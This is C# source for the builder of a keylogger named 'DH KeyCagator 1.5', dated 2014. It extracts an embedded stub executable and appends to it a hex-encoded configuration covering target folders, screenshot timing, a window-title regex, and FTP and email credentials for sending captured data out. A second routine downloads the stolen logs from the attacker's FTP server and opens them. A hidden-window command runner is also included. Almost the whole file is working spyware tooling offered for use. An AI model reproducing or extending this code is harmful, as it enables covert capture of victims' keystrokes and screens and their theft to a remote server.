// DH KeyCagator 1.5
// (C) Doddy Hackman 2014

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using System.Diagnostics;
using System.Reflection;

namespace builder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // Functions

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();
        }

        public void cmd_normal(string command)
        {
            System.Diagnostics.Process.Start("cmd", "/c " + command);
        }

        public void cmd_hide(string command)
        {
            ProcessStartInfo cmd_now = new ProcessStartInfo("cmd", "/c " + command);
            cmd_now.RedirectStandardOutput = false;
            cmd_now.WindowStyle = ProcessWindowStyle.Hidden;
            cmd_now.UseShellExecute = true;
            Process.Start(cmd_now);

        }

        public void listar_y_descargar(string host, string user, string pass, string path)
        {

            // Based on : http://social.msdn.microsoft.com/Forums/en-US/079fb811-3c55-4959-85c4-677e4b20bea3/downloading-all-files-in-directory-ftp-and-c?forum=ncl
            // Thanks to sumitlathwal

            List<string> archivos = new List<string> { };

            WebResponse contenido = null;
            StreamReader leyendo = null;
            try
            {
                FtpWebRequest cliente_ftp = (FtpWebRequest)FtpWebRequest.Create("ftp://" + host + "/" + path + "/");
                cliente_ftp.UseBinary = true;
                cliente_ftp.Credentials = new NetworkCredential(user, pass);
                cliente_ftp.Method = WebRequestMethods.Ftp.ListDirectory;
                cliente_ftp.KeepAlive = false;
                cliente_ftp.UsePassive = false;
                contenido = cliente_ftp.GetResponse();
                leyendo = new StreamReader(contenido.GetResponseStream());
                string leyendonow = leyendo.ReadLine();
                while (leyendonow != null)
                {
                    if (leyendonow != "" || leyendonow != " ")
                    {
                        archivos.Add(leyendonow);
                    }
                    leyendonow = leyendo.ReadLine();
                }

            }
            catch
            {
                //
            }

            if (archivos.Count != 0)
            {

                MessageBox.Show("Download files , please wait");

                foreach (string archivo in archivos)
                {
                    bajar_archivo_ftp(host, user, pass, path, archivo);
                    //MessageBox.Show(archivo);
                }
            }
            else
            {
                MessageBox.Show("Logs not found");
            }

        }

        public void bajar_archivo_ftp(string host, string user, string pass, string path, string archivo)
        {

            // Based on : http://stackoverflow.com/questions/2781654/ftpwebrequest-download-file
            // Thanks to Mark Kram

            string url_ftp = "ftp://" + host + "/" + path + "/" + archivo;

            try
            {

                WebClient ftp_client = new WebClient();

                ftp_client.Credentials = new NetworkCredential(user, pass);
                byte[] bajando_archivo = ftp_client.DownloadData(url_ftp);

                FileStream bajado = File.Create(Path.GetFileName(url_ftp));
                bajado.Write(bajando_archivo, 0, bajando_archivo.Length);
                bajado.Close();

                //MessageBox.Show(url_ftp);


            }

            catch
            {
                //
            }
        }

        public void savefile(string file, string texto)
        {

            try
            {
                System.IO.StreamWriter save = new System.IO.StreamWriter(file, true);
                save.Write(texto);
                save.Close();
            }
            catch
            {
                //
            }
        }

        public void extraer_recurso(string name, string save)
        {

            // Based on : http://www.c-sharpcorner.com/uploadfile/40e97e/saving-an-embedded-file-in-C-Sharp/
            // Thanks to Jean Paul

            try
            {
                Stream bajando_recurso = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
                FileStream yacasi = new FileStream(save, FileMode.CreateNew);
                for (int count = 0; count < bajando_recurso.Length; count++)
                {
                    byte down = Convert.ToByte(bajando_recurso.ReadByte());
                    yacasi.WriteByte(down);
                }
                yacasi.Close();
            }
            catch
            {
                MessageBox.Show("Error unpacking resource");
            }

        }

        //

        private void mephobiaButton1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void mephobiaButton2_Click(object sender, EventArgs e)
        {
            string linea_generada = "";

            string password_text = password.Text;

            string opcion_directorio_especial_text = "";
            string directorio_especial_text = "";

            if (opcion_directorio_especial.Checked)
            {
                opcion_directorio_especial_text = "1";
                directorio_especial_text = directorio_especial.SelectedItem.ToString();
            }
            else
            {
                opcion_directorio_especial_text = "0";
                directorio_especial_text = "";
            }

            string opcion_directorio_normal_text = "";

            if (opcion_directorio_normal.Checked)
            {
                opcion_directorio_normal_text = "1";
            }
            else
            {
                opcion_directorio_normal_text = "0";
            }

            string directorio_normal_text = directorio_normal.Text;

            string carpeta_text = carpeta.Text;

            string opcion_capturar_pantalla_normal_text = "";

            if (opcion_capturar_pantalla_normal.Checked)
            {
                opcion_capturar_pantalla_normal_text = "1";
            }
            else
            {
                opcion_capturar_pantalla_normal_text = "0";
            }

            string tiempo_capture_pantalla_normal_text = tiempo_capture_pantalla_normal.Text;

            string opcion_capturar_pantalla_especial_text = "";

            if (opcion_capturar_pantalla_especial.Checked)
            {
                opcion_capturar_pantalla_especial_text = "1";
            }
            else
            {
                opcion_capturar_pantalla_especial_text = "0";
            }

            string regex_for_windows_text = regex_for_windows.Text;

            string opcion_ftp_sender_text = "";

            if (opcion_ftp_sender.Checked)
            {
                opcion_ftp_sender_text = "1";
            }
            else
            {
                opcion_ftp_sender_text = "0";
            }

            string tiempo_ftp_sender_text = tiempo_ftp_sender.Text;

            string ftp_host_text = ftp_host.Text;
            string ftp_user_text = ftp_user.Text;
            string ftp_pass_text = ftp_pass.Text;
            string ftp_path_text = ftp_path.Text;

            string opcion_sender_mail_text = "";

            if (opcion_sender_mail.Checked)
            {
                opcion_sender_mail_text = "1";
            }
            else
            {
                opcion_sender_mail_text = "0";
            }

            string tiempo_sender_mail_text = tiempo_sender_mail.Text;

            string opcion_sender_mail_only_text = "";

            if (opcion_sender_mail_only.Checked)
            {
                opcion_sender_mail_only_text = "1";
            }
            else
            {
                opcion_sender_mail_only_text = "0";
            }

            string mail_user_text = mail_user.Text;
            string mail_pass_text = mail_pass.Text;
            string mail_to_text = mail_to.Text;

            extraer_recurso("builder.Resources.stub.exe","stub.exe");

            string check_stub = AppDomain.CurrentDomain.BaseDirectory + "/stub.exe";
            string work_on_stub = AppDomain.CurrentDomain.BaseDirectory + "/done.exe";

            if (File.Exists(check_stub))
            {

                if (File.Exists(work_on_stub))
                {
                    System.IO.File.Delete(work_on_stub);
                }

                System.IO.File.Copy(check_stub, work_on_stub);

                linea_generada = "-password-" + password_text + "-password-" +
                "-opcion_directorio_especial-" + opcion_directorio_especial_text + "-opcion_directorio_especial-" +
                "-directorio_especial-" + directorio_especial_text + "-directorio_especial-" +
                "-opcion_directorio_normal-" + opcion_directorio_normal_text + "-opcion_directorio_normal-" +
                "-directorio_normal-" + directorio_normal_text + "-directorio_normal-" +
                "-carpeta-" + carpeta_text + "-carpeta-" +
                "-opcion_capturar_pantalla_normal-" + opcion_capturar_pantalla_normal_text + "-opcion_capturar_pantalla_normal-" +
                "-tiempo_capture_pantalla_normal-" + tiempo_capture_pantalla_normal_text + "-tiempo_capture_pantalla_normal-" +
                "-opcion_capturar_pantalla_especial-" + opcion_capturar_pantalla_especial_text + "-opcion_capturar_pantalla_especial-" +
                "-regex_for_windows-" + regex_for_windows_text + "-regex_for_windows-" +
                "-opcion_ftp_sender-" + opcion_ftp_sender_text + "-opcion_ftp_sender-" +
                "-tiempo_ftp_sender-" + tiempo_ftp_sender_text + "-tiempo_ftp_sender-" +
                "-ftp_host-" + ftp_host_text + "-ftp_host-" +
                "-ftp_user-" + ftp_user_text + "-ftp_user-" +
                "-ftp_pass-" + ftp_pass_text + "-ftp_pass-" +
                "-ftp_path-" + ftp_path_text + "-ftp_path-" +
                "-opcion_sender_mail-" + opcion_sender_mail_text + "-opcion_sender_mail-" +
                "-tiempo_sender_mail-" + tiempo_sender_mail_text + "-tiempo_sender_mail-" +
                "-opcion_sender_mail_only-" + opcion_sender_mail_only_text + "-opcion_sender_mail_only-" +
                "-mail_user-" + mail_user_text + "-mail_user-" +
                "-mail_pass-" + mail_pass_text + "-mail_pass-" +
                "-mail_to-" + mail_to_text + "-mail_to-";

                string generado = hexencode(linea_generada);
                string linea_final = "-63686175-" + generado + "-63686175-";

                FileStream abriendo = new FileStream(work_on_stub, FileMode.Append);
                BinaryWriter seteando = new BinaryWriter(abriendo);
                seteando.Write(linea_final);
                seteando.Flush();
                seteando.Close();
                abriendo.Close();

                try
                {
                    System.IO.File.Delete(check_stub);
                }
                catch
                {
                    //
                }

                //MessageBox.Show(generado);
                //MessageBox.Show(hexdecode(generado));

                MessageBox.Show("Keylogger Generated");

            }
            else
            {
                MessageBox.Show("Stub not found");
            }

        }

        private void mephobiaButton3_Click(object sender, EventArgs e)
        {

            string directorio_descargas = AppDomain.CurrentDomain.BaseDirectory+"/Downloads/";

            if (!Directory.Exists(directorio_descargas))
            {
                Directory.CreateDirectory(directorio_descargas);
            }

            Directory.SetCurrentDirectory(directorio_descargas);

            listar_y_descargar(open_logs_ftp_host.Text, open_logs_ftp_user.Text, open_logs_ftp_pass.Text, open_logs_ftp_path.Text);

            string open_logs = directorio_descargas + "logs.html";

            cmd_normal("\""+open_logs+"\"");

            MessageBox.Show("Logs Ready");

        }
    }
}

// The End ?